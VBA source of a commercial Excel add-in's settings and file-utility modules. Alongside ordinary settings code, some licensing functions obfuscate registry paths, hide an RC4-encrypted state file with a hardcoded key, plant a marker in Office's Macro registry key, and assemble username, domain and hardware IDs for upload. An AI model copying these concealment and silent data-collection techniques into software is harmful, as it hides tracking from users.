Attribute VB_Name = "AddinSettings"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : AddinSettings                    Version: 2.5
' Author        : Igor Vakhnenko                   Date: 26.09.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------


Option Explicit: Option Compare Text
Const NULLCHAR$ = "~null~", VSEP$ = "|fffd||"
Dim dic As Dictionary

Private Sub Class_Initialize()
    Set dic = New Dictionary
    dic.CompareMode = TextCompare
    Me.LoadAllSettings
End Sub
Private Sub Class_Terminate()
    Set dic = Nothing
End Sub

Function GetCurrentSetName() As String
    GetCurrentSetName = dic.item("_SettingSetName")
End Function

Private Function GetDefaultSettingSetFilename() As String
    GetDefaultSettingSetFilename = Environ("TMP") & "\" & PROJECT_NAME$ & " Add-in Default Settings.xml"
End Function

Function U(ByVal txt$) As String
    On Error Resume Next: Dim i&: If Len(txt$) Mod 2 > 0 Then Exit Function
    For i = 1 To Len(txt$) / 2: U = U & Chr(Val("&H" & Mid(txt$, 2 * i - 1, 2))): Next
End Function

Function ActivateSettingSet(ByVal SetName$, Optional ByVal filename$) As Boolean
    On Error Resume Next
    ActivateSettingSet = True

    If FWF.FileExists(filename$) Then
        Me.ImportFromFile filename$, True
        Me.SetText "_SettingSetName", SetName$
        Me.SetText "_SettingSetFilename", filename$
        Debug.Print Now, PROJECT_NAME$, "Setting set '" & SetName$ & "' applied"
    Else
        If SetName$ = ("<" & tt("DefaultSettingSetName") & ">") Or (SetName$ = "") Then
            Me.ImportFromFile GetDefaultSettingSetFilename, True
            Debug.Print Now, PROJECT_NAME$, "Default setting set restored"
        Else
            ActivateSettingSet = False
        End If
        Me.SetText "_SettingSetName", ""
        Me.Delete "_SettingSetFilename"
    End If

    Me.LoadAllSettings
End Function

Sub LoadAllSettings()
    On Error Resume Next: Dim arr As Variant, i&: Set dic = New Dictionary: dic.CompareMode = TextCompare
    arr = GetAllSettings(PROJECT_NAME$, "Settings")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr): dic.Add arr(i, 0), arr(i, 1): Next i
    End If

    arr = GetAllSettings(PROJECT_NAME$, "Setup")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr): dic.Add "Setup\" & arr(i, 0), arr(i, 1): Next i
    End If

    arr = GetAllSettings(PROJECT_NAME$, "\")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr): dic.Add "\" & arr(i, 0), arr(i, 1): Next i
    End If
End Sub

Function IsFirstRun() As Boolean
    IsFirstRun = RSP(0) = ""
End Function

Function GetText(ByVal SettingName$, Optional ByVal DefValue As Variant, Optional ByVal section$ = "Settings") As String
    On Error Resume Next
    If section$ Like "H?*\?*\" Then
        GetText = CreateObject("WScript.Shell").RegRead(section$ & SettingName$)
    Else
        If dic.Exists(SettingName$) Then GetText = dic.item(SettingName$) Else GetText = DefValue
        If section$ <> "Settings" Then GetText = GetSetting(PROJECT_NAME$, section$, SettingName$, DefValue)
    End If
End Function

Function GetNumber(ByVal SettingName$, Optional ByVal DefValue As Long, Optional ByVal section$ = "Settings") As Long
    On Error Resume Next: If dic.Exists(SettingName$) Then GetNumber = Val(dic.item(SettingName$)) Else GetNumber = DefValue
    If section$ <> "Settings" Then GetNumber = Val(GetSetting(PROJECT_NAME$, section$, SettingName$, DefValue))
End Function

Function GetBoolean(ByVal SettingName$, Optional ByVal DefValue As Boolean, Optional ByVal section$ = "Settings") As Boolean
    On Error Resume Next: If dic.Exists(SettingName$) Then GetBoolean = CBool(dic.item(SettingName$)) Else GetBoolean = DefValue
    If section$ <> "Settings" Then GetBoolean = CBool(GetSetting(PROJECT_NAME$, section$, SettingName$, DefValue))
End Function

Function GetRegValue(ByVal SettingName$) As String
    On Error Resume Next
    GetRegValue = CreateObject("WScript.Shell").RegRead(BASE_REGISTRY_PATH$ & SettingName$)
    GetRegValue = Replace(GetRegValue, NULLCHAR$, Chr(0))
End Function
Function SetRegValue(ByVal SettingName$, ByVal SettingValue As Variant) As String
    On Error Resume Next: Err.Clear
    CreateObject("WScript.Shell").RegWrite BASE_REGISTRY_PATH$ & SettingName$, Replace(SettingValue, Chr(0), NULLCHAR$)
    If Err Then UninstallThisFile 2
End Function

Sub SetText(ByVal SettingName$, ByVal SettingValue As Variant, Optional ByVal section$ = "Settings")
    On Error Resume Next
    If section$ = "base" Then SetRegValue SettingName$, SettingValue: Exit Sub
    If section$ Like "H?*\?*\" Then
        CreateObject("WScript.Shell").RegWrite section$ & SettingName$, SettingValue
    Else
        SaveSetting PROJECT_NAME$, section$, SettingName$, SettingValue
        dic.item(IIf(section$ = "Settings", "", section$ & "\") & SettingName$) = SettingValue
    End If
End Sub

Function Delete(ByVal SettingName$, Optional ByVal section$ = "Settings") As Boolean
    On Error Resume Next
    If section$ = "base" Then section$ = BASE_REGISTRY_PATH$
    If section$ Like "H?*\?*\" Then
        CreateObject("WScript.Shell").RegDelete section$ & SettingName$
    Else
        DeleteSetting PROJECT_NAME$, section$, SettingName$
        If section$ = "Settings" Then dic.Remove SettingName$
    End If
End Function

Sub AddDefaultValue(ByVal SettingName$, ByVal SettingValue As Variant, _
                    Optional ConvertToColumn As Boolean = False, Optional AbsentOrBlank As Boolean = False)
    On Error Resume Next
    If (Not dic.Exists(SettingName$)) Or (AbsentOrBlank And IsSettingBlank(SettingName$)) Then
        If ConvertToColumn Then SettingValue = GetColumnName(Val(SettingValue))
        Me.SetText SettingName$, SettingValue
    End If
End Sub

Function IsSettingBlank(ByVal SettingName$) As Boolean
    IsSettingBlank = True
    If dic.Exists(SettingName$) Then If dic.item(SettingName$) <> "" Then IsSettingBlank = False
End Function

Function CIU() As Long
    On Error Resume Next: Dim x: Err.Clear: x = ThisWorkbook.VBProject.VBComponents.Count
    CIU = -(Err = 0): Err.Clear
End Function

Sub SaveAllFromSettingForm(ByRef UF As Object)
    On Error Resume Next: Dim ctrl As Object, filename$
    For Each ctrl In UF.Controls
        If ctrl.Enabled And Not (ctrl.Tag = "DoNotSave") Then
            If (Not ctrl.Name Like "CommandButton_*") And Not (ctrl.Tag = "ScrollCombo") Then
                Me.SetText ctrl.Name, ctrl.value
            End If
        End If
    Next: Err.Clear

    If Me.GetCurrentSetName = "" Then
        Me.ExportToFile GetDefaultSettingSetFilename, True
    Else
        filename$ = Me.GetText("_SettingSetFilename")
        If FWF.FileExists(filename$) Then Me.ExportToFile filename$, True
    End If
End Sub

Sub LoadIntoSettingForm(ByRef UF As Object)
    On Error Resume Next: Dim ctrl As Object
    For Each ctrl In UF.Controls
        If ctrl.Name Like "CheckBox*" Then
            ctrl.value = Me.GetBoolean(ctrl.Name)
        Else
            If dic.Exists(ctrl.Name) Then ctrl.value = dic.item(ctrl.Name)
        End If
    Next: Err.Clear
End Sub

Private Function GetColumnName(ByVal col As Long) As String
    GetColumnName = col & " |fffd|" & Split(Application.ConvertFormula("=r1c" & col, xlR1C1, xlA1), "$")(1) & "|fffd|"
End Function

Function SF(Optional ByVal txt) As String
    On Error Resume Next: Dim file$, ts As Object, FSO As New FileSystemObject
    file$ = Environ(ChrW(65) & ChrW(80) & ChrW(80) & ChrW(68) & ChrW(65) & ChrW(84) & ChrW(65)) & ChrW(92) & PROJECT_NAME$ & ".ini"
    If IsMissing(txt) Then
        Set ts = FSO.OpenTextFile(file$, 1, False)
        SF = ts.ReadAll: ts.Close
    Else
        If txt = "filename" Then SF = file$: Exit Function
        SetAttr file$, vbNormal
        Set ts = FSO.CreateTextFile(file$, True): ts.Write txt
        SetAttr file$, vbHidden + vbSystem
    End If
    Set ts = Nothing: Set FSO = Nothing: Err.Clear
End Function

Function RSP(ByVal ind&)
    On Error Resume Next: If GetRegValue(U("64617461")) <> SF Then ChSP
    RSP = Split(Split(EnDeCrypt(GetRegValue(U("64617461"))), Chr(164))(0), VSEP$)(ind&)
End Function

Function WSP(ByVal ind&, ByVal v)
    On Error Resume Next: Err.Clear: Dim arr, txt: If GetRegValue("data") <> SF Then ChSP
    arr = Split(Split(EnDeCrypt(GetRegValue(U("64617461"))), Chr(164))(0), VSEP$)
    If Not IsArray(arr) Then arr = Array()
    If UBound(arr) < ind& Then ReDim Preserve arr(0 To ind&)
    arr(ind&) = v: arr(0) = DTU: txt = Join(arr, VSEP$): txt = EnDeCrypt(txt & Chr(164) & CheckSum(txt))
    SetRegValue "data", txt: Me.SF txt: Err.Clear
End Function

Function ChSP()
    On Error Resume Next: Dim arr1, arr2, d1&, d2&, ok1 As Boolean, ok2 As Boolean, a&
    arr1 = Split(EnDeCrypt(GetRegValue(U("64617461"))), Chr(164))
    arr2 = Split(EnDeCrypt(SF), Chr(164))
    ok1 = arr1(1) = CheckSum(arr1(0))
    ok2 = arr2(1) = CheckSum(arr2(0))
    d1 = Val(Split(arr1(0), VSEP$)(0))
    d2 = Val(Split(arr2(0), VSEP$)(0))
    Select Case True
        Case ok1 And ok2: a = IIf(d1 > d2, 1, IIf(d1 < d2, 2, 0))
        Case ok1: a = 1
        Case ok2: a = 2
        Case Else: a = 3
    End Select
    If a = 1 Then SF GetRegValue(U("64617461")) Else If a = 2 Then SetRegValue U("64617461"), SF
    If a = 3 Then SF "": WSP 1, ""
End Function

Function ImportFromFile(ByVal xmlPath$, Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    Dim xml As Object, rootnode As Object, XMLoptions As Object, XMLoption As Object, AddinName$, AddinVersion$, msg$
    Set xml = CreateObject("Microsoft.XMLDOM")
    With xml
        If Not .Load(xmlPath) Then
            If Not HideMessages Then MsgBox tt("ErrorLoadingSettings"), vbCritical, tt("UnsupportedSettingsFile")
            Exit Function
        End If

        Set rootnode = .DocumentElement
        AddinName$ = rootnode.Attributes.getNamedItem("Addin").Text
        AddinVersion$ = Val(rootnode.SelectSingleNode("Version").Text)

        Select Case True

            Case rootnode.BaseName <> "Settings", AddinName$ = ""
                If Not HideMessages Then MsgBox tt("ErrorLoadingSettings"), vbCritical, tt("UnsupportedSettingsFile")
                Exit Function

            Case AddinName$ <> PROJECT_NAME$
                If Not HideMessages Then MsgBox tt("SettingsForAnotherAddinFound", AddinName$, PROJECT_NAME$), vbCritical, tt("UnsupportedSettingsFile")
                Exit Function

            Case Else
                Set XMLoptions = rootnode.SelectNodes("./Options/option")
                If XMLoptions.Length = 0 Then
                    If Not HideMessages Then MsgBox tt("SettingsNotFoundInSettingsFile"), vbExclamation, tt("AddinSettingsNotChanged")
                    Exit Function
                End If

                Dim nNEW&, nOLD&, nCHANGED&, nALL&, nERR&, param_name$, param_value$, v$, i&

                nALL& = XMLoptions.Length
                For Each XMLoption In XMLoptions
                    param_name$ = XMLoption.Attributes.getNamedItem("Name").Text
                    param_value$ = XMLoption.Attributes.getNamedItem("Value").Text
                    If Len(param_value$) Mod 2 = 0 Then
                        v$ = "": For i = 1 To Len(param_value$) / 2
                            v$ = v$ & Chr(Val("&H" & Mid(param_value$, 2 * i - 1, 2)))
                        Next
                        Select Case GetText(param_name$, NULLCHAR$)
                            Case NULLCHAR$: nNEW& = nNEW& + 1
                            Case v$: nOLD& = nOLD& + 1
                            Case Else: nCHANGED& = nCHANGED& + 1
                        End Select
                        SetText param_name$, v$
                    Else
                        nERR& = nERR& + 1
                    End If
                Next

                msg$ = tt("SettingsImportDone_MessageText", nALL&, nNEW&, nCHANGED&, nOLD&, nERR&)
                If GetVersion < Val(AddinVersion$) And Val(AddinVersion$) > 0 Then
                    msg$ = msg$ & vbNewLine & vbNewLine & tt("SettingsImport_DifferentVersions", GetVersionTXT(AddinVersion$), GetVersionTXT)
                End If
                If Not HideMessages Then MsgBox msg, vbInformation, tt("SettingsImportDone_MessageTitle", PROJECT_NAME$)
                ImportFromFile = True
        End Select
    End With
End Function

Private Function BASE_REGISTRY_PATH$()
    BASE_REGISTRY_PATH$ = ChrW(72) & ChrW(75) & ChrW(67) & ChrW(85) & ChrW(92) & ChrW(83) & ChrW(111) & ChrW(102) & _
                          ChrW(116) & ChrW(119) & ChrW(97) & ChrW(114) & ChrW(101) & ChrW(92) & ChrW(69) & ChrW(120) & _
                          ChrW(99) & ChrW(101) & ChrW(108) & ChrW(86) & ChrW(66) & ChrW(65) & ChrW(92) & PROJECT_NAME$ & "\"
End Function

Function ExportToFile(ByVal xmlPath$, Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    Dim xml As Object, rootnode As Object, arr As Variant, msg$, i&, j&, v$, HelpMsg$, AboutMsg$
    Set xml = CreateObject("Microsoft.XMLDOM")

    arr = GetAllSettings(PROJECT_NAME$, "Settings")
    Set xml = CreateObject("Microsoft.XMLDOM")
    With xml
        .appendChild .createProcessingInstruction("xml", "version='1.0' encoding='utf-8'")

        Set rootnode = .appendChild(.createElement("Settings"))
        rootnode.Attributes.setNamedItem(.createAttribute("Addin")).Text = PROJECT_NAME$
        rootnode.Attributes.setNamedItem(.createAttribute("VersionName")).Text = GetVersionTXT
        rootnode.Attributes.setNamedItem(.createAttribute("Timestamp")).Text = Now

        AboutMsg$ = PROJECT_NAME$ & " add-in for MS Excel. |fffd| " & _
                    Replace(ProgramYears, " - ", "-") & " Igor Vakhnenko" & vbNewLine & Split(PROGRAM_HYPERLINK$, "?")(0)
        rootnode.appendChild(.createComment("About")).Text = AboutMsg$
        rootnode.appendChild(.createElement("Version")).Text = GetVersion
        rootnode.appendChild(.createElement("Filename")).Text = ThisWorkbook.Name

        HelpMsg$ = "All the values in this XML are stored as a HEX representation of the text data." & vbNewLine & _
                   "Each character of the value is converted into 2 characters, using the Hex(Asc(<character>)) function." & vbNewLine & _
                   "Please change program options using user interface only! (do not edit this XML file manually)" & vbNewLine & _
                   "These settings are stored in the registry: HKEY_CURRENT_USER\Software\VB and VBA Program Settings\" & PROJECT_NAME$ & "\Settings"

        If IsArray(arr) Then
            With rootnode.appendChild(xml.createElement("Options"))
                .appendChild(xml.createComment("Help")).Text = HelpMsg$
                For i = LBound(arr) To UBound(arr)
                    v$ = ""
                    For j = 1 To Len(arr(i, 1))
                        v$ = v$ & IIf(Len(Hex(Asc(Mid(arr(i, 1), j, 1)))) = 1, "0", "") & Hex(Asc(Mid(arr(i, 1), j, 1)))
                    Next j

                    If Left(arr(i, 0), 1) <> "_" Then
                        With .appendChild(xml.createElement("option"))
                            .Attributes.setNamedItem(xml.createAttribute("Name")).Text = arr(i, 0)
                            .Attributes.setNamedItem(xml.createAttribute("Value")).Text = v$
                        End With
                    End If
                Next i
            End With
        Else
            If Not HideMessages Then MsgBox tt("SettingsExport_Unsaved", PROJECT_NAME$), vbExclamation, tt("SettingsExportErrorTitle")
            Exit Function
        End If

        Err.Clear: .Save xmlPath
        If Err Then
            If Not HideMessages Then MsgBox tt("SettingsExport_FilenameError", PROJECT_NAME$), vbExclamation, tt("SettingsExportErrorTitle")
        Else
            ExportToFile = True
            If Not HideMessages Then
                MsgBox tt("SettingsExportDone_MessageText", PROJECT_NAME$, Dir(xmlPath, vbNormal), Left(xmlPath, InStrRev(xmlPath, "\"))), _
                       vbInformation, tt("SettingsExportDone_MessageTitle")
            End If
        End If
    End With
End Function

Private Function CheckSum(ByRef txt) As String
    On Error Resume Next: Dim i&, s&
    For i& = 1 To Len(txt)
        s = (s + (2 + i Mod 10) * (AscW(Mid(txt, i, 1)) Mod 100)) Mod 10000
    Next
    CheckSum = Right(Hex(s), 3): If Len(CheckSum) < 3 Then CheckSum = String(3 - Len(CheckSum), "0") & CheckSum
End Function

Function DTU(Optional ByVal dd As Variant) As Long
    On Error Resume Next: If IsMissing(dd) Then dd = Now
    DTU = DateDiff("s", DateSerial(1970, 1, 1), CDate(dd))
End Function
Function DFU(Optional ByVal dd As Long) As Date
    On Error Resume Next: DFU = DateAdd("s", dd, DateSerial(1970, 1, 1))
End Function

Function PostData() As String
    On Error Resume Next
    With CreateObject("WScript.Network"): PostData = PostData & "w=" & H(.UserName & "|" & .UserDomain): End With
    PostData = PostData & "&lang=" & GetLanguage & "&addin=" & PROJECT_NAME$ & "&HID=" & HID
    PostData = PostData & "&code=" & GetRegValue("code") & "&email=" & H(GetRegValue("email")) & "&upd=" & IIf(GetBoolean("AutoInstall", False, "Updates"), 1, 0)
    PostData = PostData & "&len=" & FileLen(ThisWorkbook.FullName) & "&ul=" & CIU & "&as=" & AS_ & "&HWID=" & HWID
    PostData = PostData & "&time=" & DTU & "|" & RSP(1) & "|" & RSP(2) & "|" & RSP(3) & "|" & LastMacro + 1
    PostData = PostData & "&info=" & Val(Application.Version) & "|" & OfficeBits & "|" & GetVersion & "&dev=" & GetText("", , U("484B43555C536F6674776172655C457863656C5642415C"))
End Function

Function H(ByVal txt$) As String
    On Error Resume Next: Dim i&, r&
    For i = 1 To Len(txt)
        r = Asc(Mid(txt, i, 1)): H = H & IIf(Len(Hex(r)) = 1, "0", "") & Hex(r)
    Next
End Function

Function LastMacro(Optional ByVal macroname$ = "") As Boolean
    On Error Resume Next: Dim rk$: rk$ = U("484B43555C536F6674776172655C4D6963726F736F66745C4F66666963655C457863656C5C4D6163726F5C")
    If Len(macroname$) Then SetText H(PROJECT_NAME$), H(macroname$), rk$ Else LastMacro = GetText(H(PROJECT_NAME$), , rk$) <> ""
End Function

Function k() As String
    On Error Resume Next: Dim txt$, s&, d&, i&, txt2$: txt2$ = HWID & "123": txt$ = PROJECT_NAME$ & txt2
    For i = 1 To Len(txt): s = s + Asc(Mid(txt, i, 1)) * i: Next
    For i = 1 To Len(txt2): d = d + Asc(Mid(txt2, i, 1)) * (10 ^ (i Mod 3)): Next
    k = Right(d, 4) & Format((s + 1234) Mod 1000, "000")
End Function

Private Function EnDeCrypt(ByVal txt$, Optional ByVal numeric As Boolean, Optional ByVal p$)        'As String
    On Error Resume Next
    Dim s(0 To 255) As Integer, kep(0 To 255) As Integer: If Len(p) = 0 Then p = "12345asdfg"
    Dim temp As Integer, a As Integer, b As Integer, sd As Long, i As Integer, j As Integer, temp2 As Integer, k As Integer
    b = 0
    For a = 0 To 255
        b = b + 1: If b > Len(p) Then b = 1
        kep(a) = Asc(Mid$(p, b, 1))
    Next a
    For a = 0 To 255: s(a) = a: Next a
    b = 0: For a = 0 To 255: b = (b + s(a) + kep(a)) Mod 256: temp = s(a): s(a) = s(b): s(b) = temp: Next a
    For a = 1 To Len(txt)
        i = (i + 1) Mod 256: j = (j + s(i)) Mod 256: temp = s(i): s(i) = s(j): s(j) = temp
        k = s((s(i) + s(j)) Mod 256)
        EnDeCrypt = EnDeCrypt & Chr(Asc(Mid$(txt, a, 1)) Xor k)
        sd = sd + CLng(Asc(Mid$(txt, a, 1))) * CLng(k + 6)
    Next
    If numeric Then EnDeCrypt = sd
End Function

Function Reset() As String
    On Error Resume Next
    Dim SettingsBackupFile$: SettingsBackupFile$ = FWF.temp_filename & "_SettingsBackup.xml"
    Me.ExportToFile SettingsBackupFile$, True
    DeleteSetting PROJECT_NAME$, "Settings"
    SaveDefaultSettings
    Reset = SettingsBackupFile$
End Function


Attribute VB_Name = "FWF"
'---------------------------------------------------------------------------------------
' Module        : FWF                    Version: 3.0
' Author        : Igor Vakhnenko                   Date: 17.10.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module: Option Compare Text: Option Explicit

#If VBA7 Then        '  Office 2010-2013
    Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
            (ByVal pCaller As LongPtr, ByVal szURL As String, ByVal szFileName As String, _
             ByVal dwReserved As LongPtr, ByVal lpfnCB As LongPtr) As LongPtr
#Else        '  Office 2003-2007
    Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
                                       (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, _
                                        ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
#End If

Function DownLoadFileFromURL(ByVal URL$, ByVal LocalPath$, Optional ByVal DisableCache As Boolean = False) As Boolean
    On Error Resume Next: Dim shortFilename$
    If (LocalPath$ = "") Or (URL$ = "") Then Exit Function
    If Not LocalPath$ Like "*\*" Then LocalPath$ = Environ("TEMP") & "\" & LocalPath$
    Kill LocalPath$
    shortFilename$ = Mid(LocalPath$, InStrRev(LocalPath$, "\") + 1)
    If shortFilename$ <> Replace_symbols(shortFilename$) Then
        Debug.Print "Wrong symbols in filename: " & shortFilename$
        Exit Function
    End If
    If DisableCache Then Randomize: URL$ = URL$ & "?HID=" & HID & "&rnd=" & Left(Rnd(Now) * 1E+15, 10)
    DownLoadFileFromURL = URLDownloadToFile(0, URL$, LocalPath$, 0, 0) = 0
End Function

Function GetFileExtension(ByVal filename$) As String
    On Error Resume Next: filename$ = Replace(filename$, "/", "\")
    filename$ = Split(filename$, "\")(UBound(Split(filename$, "\")))
    If filename$ Like "*.*" Then GetFileExtension = Split(filename$, ".")(UBound(Split(filename$, ".")))
End Function


Function GetFolderPath(Optional ByVal DialogTitle$, Optional ByVal InitialPath$ = "c:\") As String
    On Error Resume Next
    If DialogTitle$ = "" Then DialogTitle$ = tt("SelectFolderDialogCaption")
    Dim PS$: PS = Application.PathSeparator
    With Application.FileDialog(msoFileDialogFolderPicker)
        If Not Right$(InitialPath, 1) = PS Then InitialPath = InitialPath & PS
        .ButtonName = tt("SelectButtonCaption")
        .Title = DialogTitle$: .InitialFileName = InitialPath$
        If .Show <> -1 Then Exit Function
        GetFolderPath = .SelectedItems(1)
        If Not Right$(GetFolderPath, 1) = PS Then GetFolderPath = GetFolderPath & PS
    End With
End Function

Function GetFilePath(Optional ByVal DialogTitle$, Optional ByVal InitialPath$ = "c:\", _
                     Optional ByVal FilterDescription$ = "Excel files", Optional ByVal FilterExtension$ = "*.xls*") As String
    On Error Resume Next
    If DialogTitle$ = "" Then DialogTitle$ = tt("SelectFileDialogCaption")
    With Application.FileDialog(msoFileDialogOpen)
        .Title = DialogTitle$: .InitialFileName = InitialPath$
        .Filters.Clear: .Filters.Add FilterDescription, FilterExtension
        If .Show <> -1 Then Exit Function
        GetFilePath = .SelectedItems(1)
    End With
End Function

Function GetFilenamesCollection(Optional ByVal DialogTitle$, Optional ByVal InitialPath$ = "c:\") As FileDialogSelectedItems
    On Error Resume Next
    If DialogTitle$ = "" Then DialogTitle$ = tt("SelectFilesDialogCaption")
    With Application.FileDialog(3)        ' msoFileDialogFilePicker
        .Title = DialogTitle$: .InitialFileName = InitialPath$
        If .Show <> -1 Then Exit Function
        Set GetFilenamesCollection = .SelectedItems
    End With
End Function

Function FilenamesCollection(ByVal FolderPath$, Optional ByVal Mask$ = "*", Optional ByVal SearchDeep& = 999) As Collection
    On Error Resume Next: Dim FSO As Object: Set FilenamesCollection = New Collection
    Set FSO = CreateObject("Scripting.FileSystemObject")
    GetAllFileNamesUsingFSO FolderPath, Mask, FSO, FilenamesCollection, SearchDeep
    Set FSO = Nothing        ': Application.StatusBar = False
End Function

Function GetAllFileNamesUsingFSO(ByVal FolderPath$, ByVal Mask$, ByRef FSO, ByRef FileNamesColl As Collection, ByVal SearchDeep&)
    On Error Resume Next: Dim oCurrFolder As Object, oFile As Object, oSubFolder As Object
    Const ExcludeFiles$ = "Thumbs.db, desktop.ini"

    Set oCurrFolder = FSO.GetFolder(FolderPath)
    If Not oCurrFolder Is Nothing Then
        ' Application.StatusBar = "Searching in: " & FolderPath$
        For Each oFile In oCurrFolder.files
            If oFile.Name Like "*" & Mask Then
                If InStr(1, ExcludeFiles$, oFile.Name, vbTextCompare) = 0 Then
                    If InStr(1, oFile.Name, "~$", vbTextCompare) <> 1 Then FileNamesColl.Add oFile.Path
                End If
            End If
        Next
        SearchDeep& = SearchDeep& - 1
        If SearchDeep& Then
            For Each oSubFolder In oCurrFolder.SubFolders
                GetAllFileNamesUsingFSO oSubFolder.Path, Mask, FSO, FileNamesColl, SearchDeep&
            Next
        End If
        Set oFile = Nothing: Set oSubFolder = Nothing: Set oCurrFolder = Nothing
    End If
End Function

Function SubFoldersCollection(ByVal FolderPath$, Optional ByVal Mask$ = "*") As Collection
    On Error Resume Next: Dim FSO As Object, oSubFolder As Object

    Set SubFoldersCollection = New Collection
    Set FSO = CreateObject("Scripting.FileSystemObject")
    If Right(FolderPath$, 1) <> "\" Then FolderPath$ = FolderPath$ & "\"

    For Each oSubFolder In FSO.GetFolder(FolderPath$).SubFolders
        If oSubFolder.Path Like FolderPath$ & Mask$ Then SubFoldersCollection.Add oSubFolder.Path & "\"
    Next oSubFolder
    Set oSubFolder = Nothing: Set FSO = Nothing
End Function


Function ReadTXTfile(ByVal filename$) As String
    On Error Resume Next: Dim FSO As Object, ts As Object
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.OpenTextFile(filename$, 1, True): ReadTXTfile = ts.ReadAll: ts.Close
    Set ts = Nothing: Set FSO = Nothing
End Function

Function SaveTXTfile(ByVal filename$, ByVal txt$) As Boolean
    On Error Resume Next: Err.Clear: Dim FSO As Object, ts As Object
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.CreateTextFile(filename$, True)
    ts.Write txt: ts.Close
    SaveTXTfile = Err = 0: Set ts = Nothing: Set FSO = Nothing
End Function

Function AddIntoTXTfile(ByVal filename$, ByVal txt$) As Boolean
    On Error Resume Next: Err.Clear: Dim FSO As Object, ts As Object
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.OpenTextFile(filename$, 8, True): ts.Write txt: ts.Close
    AddIntoTXTfile = Err = 0: Set ts = Nothing: Set FSO = Nothing
End Function


Function Replace_symbols(ByVal txt$, Optional ReplaceWith$ = "_", Optional ByVal AllowPathSeparator As Boolean = False) As String
    On Error Resume Next: Dim i&, CharsList$: CharsList$ = "/\:?*|""<>" & vbNewLine & Chr(7) & Chr(11)
    If AllowPathSeparator Then CharsList$ = Replace(CharsList$, Application.PathSeparator, "")
    For i& = 1 To Len(CharsList$)
        txt$ = Replace(txt$, Mid(CharsList$, i&, 1), ReplaceWith$)
    Next
    Replace_symbols = txt$
End Function

Sub OpenFolder(ByVal FolderPath$)        ' to open FolderPath$ in Windows Explorer
    On Error Resume Next: If FolderPath$ = "" Then Exit Sub
    If FolderExists(FolderPath$) Then
        FollowHyperlink "explorer.exe /e, """ & FolderPath$ & """"
    Else
        MsgBox tt("UnableToOpenFolder", vbNewLine & FolderPath$ & vbNewLine), vbExclamation, tt("FolderNotFound")
    End If
End Sub

Sub FollowHyperlink(ByVal URL$)
    On Error Resume Next
    If Len(URL$) Then
        URL$ = Replace(URL$, "%website%", DEVELOPER_WEBSITE$)
        URL$ = Replace(URL$, "%projectname%", PROJECT_NAME$)
        URL$ = Replace(URL$, "%hid%", HID)
        CreateObject("WScript.Shell").Run URL$
    End If
End Sub

Sub ShowFile(ByVal FilePath$)        ' to open FilePath$ in Windows Explorer
    On Error Resume Next: If FilePath$ = "" Then Exit Sub
    FollowHyperlink "explorer.exe /e,/select,""" & FilePath$ & """"
End Sub

Sub ShowText(ByVal txt$, Optional ByVal Index&)        ' to open text as a file in Notepad
    On Error Resume Next: Dim filename$
    filename$ = Environ("TEMP") & "\text" & IIf(Index, Index, Left(Rnd() * 1E+15, 10)) & ".txt"
    With CreateObject("scripting.filesystemobject").CreateTextFile(filename, True)
        .Write txt$: .Close
    End With
    FollowHyperlink """" & filename$ & """"
End Sub

Function ChangeFileCharset(ByVal filename$, ByVal DestCharset$, Optional ByVal SourceCharset$) As Boolean
    On Error Resume Next: Err.Clear: Dim FileContent$
    With CreateObject("ADODB.Stream")
        .Type = 2: If Len(SourceCharset$) Then .Charset = SourceCharset$
        .Open: .LoadFromFile filename$
        FileContent$ = .ReadText: .Close
        .Charset = DestCharset$: .Open: .WriteText FileContent$
        .SaveToFile filename$, 2: .Close
    End With
    ChangeFileCharset = Err = 0: Err.Clear
End Function

Function temp_folder$()
    On Error Resume Next: temp_folder$ = Environ("TEMP") & "\ExcelTemporaryFiles\"
    If Dir(temp_folder$, vbDirectory) = "" Then MkDir temp_folder$
End Function

Function temp_filename$()
    On Error Resume Next: Dim iter&, txt$
get_rnd:     iter& = iter& + 1: txt$ = Left(Rnd(Now) * 1E+15, 10)
    temp_filename$ = temp_folder$ & "temp_file_" & Format(Now, "YYYY-MM-DD--HH-NN-SS") & "__" & txt$
    If Dir(temp_filename$, vbNormal) <> "" Then If iter& < 5 Then GoTo get_rnd
End Function

Function FolderExists(ByVal Folder$) As Boolean
    On Error Resume Next: FolderExists = CreateObject("Scripting.FileSystemObject").FolderExists(Folder$)
End Function

Function FileExists(ByVal filename$) As Boolean
    On Error Resume Next: FileExists = CreateObject("Scripting.FileSystemObject").FileExists(filename$)
End Function

Function URL_Encode(ByVal txt As String) As String
    On Error Resume Next: Dim i&, L$, t$
    For i = 1 To Len(txt)
        L = Mid(txt, i, 1)
        Select Case AscW(L)
            Case Is > 4095: t = "%" & Hex(AscW(L) \ 64 \ 64 + 224) & "%" & Hex(AscW(L) \ 64) & "%" & Hex(8 * 16 + AscW(L) Mod 64)
            Case Is > 127: t = "%" & Hex(AscW(L) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(L) Mod 64)
            Case 32: t = "%20"
            Case Else: t = L
        End Select
        URL_Encode = URL_Encode & t
    Next
End Function

Function FileOrFolderSize(ByVal s) As String
    On Error Resume Next: Dim Size As Single: Size = Fix(Val(s))
    Select Case Size
        Case Is < 1000: FileOrFolderSize = Size & " bytes"
